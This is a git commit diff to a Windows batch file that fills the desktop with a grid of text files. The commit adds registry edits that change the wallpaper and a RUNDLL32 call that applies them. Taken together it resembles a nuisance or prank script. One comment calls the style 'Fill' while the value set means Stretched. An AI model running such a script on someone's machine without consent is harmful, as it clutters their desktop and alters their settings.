72de5bb82e36c53029320a6c7aea39ec61e38bdc
mickr309 <mickrosenau309@gmail.com>
2025-03-07 01:04:02 +0100

    Update commands.bat

--- commands.bat
+++ commands.bat
@@ -1,5 +1,5 @@
 @echo off
-:: Set the number of rows and columns for the grid
+:: Set the number of rows and columns for the grid of text files
 set ROWS=10
 set COLS=10
 
@@ -24,4 +24,18 @@ for /L %%i in (1, 1, %ROWS%) do (
 )
 
 echo Desktop is now filled with text files.
+
+:: Set wallpaper image path
+set WALLPAPER_PATH="D:\images.jpg"
+
+:: Set the registry key to change the wallpaper
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %WALLPAPER_PATH% /f
+
+:: Set the wallpaper style to "Fill" (other options: 0 = Centered, 2 = Stretched, 6 = Fit)
+reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
+
+:: Refresh the desktop to apply the change
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+echo Wallpaper has been changed.
 pause
